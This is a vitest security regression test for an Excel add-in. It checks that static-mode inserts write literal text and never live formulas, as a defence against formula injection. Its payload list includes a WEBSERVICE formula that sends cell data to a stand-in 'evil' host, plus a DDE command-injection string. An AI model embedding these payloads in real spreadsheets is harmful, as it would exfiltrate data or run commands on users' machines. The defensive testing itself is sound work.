/**
 * Bug-7393 (SECURITY) — "Static" insert mode must NOT write source-derived
 * values through the Excel formula channel.
 *
 * Threat: a string-valued measure/KPI whose value begins with a formula
 * trigger (`=`, `+`, `-`, `@`) — e.g. a source cell containing
 * `=WEBSERVICE("http://evil/exfil?d="&A1)` — would, if written via
 * `range.formulas`, be parsed and EXECUTED by Excel on the analyst's machine
 * (CWE-1236, spreadsheet formula injection).
 *
 * Fix under test: static-mode inserts route through `useExcel().insertLiteral`,
 * which writes the value through the VALUES channel (`range.values`) and never
 * touches `range.formulas`. Excel treats a values-channel string as literal
 * text, so a leading `=`/`+`/`-`/`@` can never become a live formula.
 *
 * This asserts the KNOWN security behavior directly against a fake Office range
 * that records which channel was written: the formula channel must remain
 * untouched for every formula-leading payload.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { renderHook } from '@testing-library/react';
import { useExcel } from '../hooks/useExcel';

/**
 * A fake Excel range that records every assignment to `.values` and
 * `.formulas`. Starts empty so the overwrite-confirm path is not triggered.
 */
function makeRecordingRange() {
  const writes = {
    valuesAssignments: [] as unknown[][][],
    formulasAssignments: [] as unknown[][][],
  };
  const range = {
    _values: [['']] as unknown[][],
    _formulas: [['']] as unknown[][],
    address: 'Sheet1!A1',
    // Bug-7397 R12-1: the write target is now PINNED from one host sample
    // (address + rowIndex + columnIndex) and the write addresses cells by
    // index on the pinned sheet, so the stub range must carry coordinates.
    rowIndex: 0,
    columnIndex: 0,
    load: () => {},
    get values() { return this._values; },
    set values(v: unknown[][]) {
      this._values = v;
      writes.valuesAssignments.push(v);
    },
    get formulas() { return this._formulas; },
    set formulas(v: unknown[][]) {
      this._formulas = v;
      writes.formulasAssignments.push(v);
    },
  };
  return { range, writes };
}

let recording: ReturnType<typeof makeRecordingRange>;

beforeEach(() => {
  recording = makeRecordingRange();
  const sheet = {
    getRange: () => recording.range,
    getRangeByIndexes: () => recording.range,
  };
  vi.stubGlobal('Excel', {
    run: async (cb: (ctx: unknown) => Promise<unknown>) =>
      cb({
        workbook: {
          getSelectedRange: () => recording.range,
          worksheets: { getActiveWorksheet: () => sheet, getItem: () => sheet },
        },
        sync: async () => {},
      }),
  });
});

const FORMULA_LEADING_PAYLOADS = [
  '=SUM(A1:A9)',
  '=WEBSERVICE("http://evil.example/exfil?d="&A1)',
  '+1+1',
  '-2+3',
  '@SUM(A1)',
  '=cmd|\'/c calc\'!A1', // classic DDE-style command injection payload
];

describe('Bug-7393: insertLiteral neutralises formula-leading source values', () => {
  it.each(FORMULA_LEADING_PAYLOADS)(
    'writes %s through the VALUES channel and never the formulas channel',
    async (payload) => {
      const { result } = renderHook(() => useExcel());
      await result.current.insertLiteral(payload);

      // The value reaches the cell verbatim through the values channel...
      expect(recording.writes.valuesAssignments).toEqual([[[payload]]]);
      // ...and the formula channel is NEVER assigned, so Office cannot parse
      // the leading =/+/-/@ as a live formula.
      expect(recording.writes.formulasAssignments).toEqual([]);
    },
  );

  it('a benign numeric string is also written via the values channel', async () => {
    const { result } = renderHook(() => useExcel());
    await result.current.insertLiteral('1234.5');
    expect(recording.writes.valuesAssignments).toEqual([[['1234.5']]]);
    expect(recording.writes.formulasAssignments).toEqual([]);
  });

  it('a null value writes an empty string via the values channel (never a formula)', async () => {
    const { result } = renderHook(() => useExcel());
    await result.current.insertLiteral(null);
    expect(recording.writes.valuesAssignments).toEqual([[['']]]);
    expect(recording.writes.formulasAssignments).toEqual([]);
  });

  it('CONTRAST: insertFormula DOES use the formula channel (proves the two paths differ)', async () => {
    // This guards the invariant from the other side: the live-mode formula
    // path intentionally writes the formula channel, so the static path's use
    // of the values channel is a deliberate, load-bearing distinction — not an
    // accident that a refactor could silently collapse.
    const { result } = renderHook(() => useExcel());
    await result.current.insertFormula('=TESSALLITE.VALUE("model","measure")');
    expect(recording.writes.formulasAssignments).toEqual([[['=TESSALLITE.VALUE("model","measure")']]]);
    expect(recording.writes.valuesAssignments).toEqual([]);
  });
});
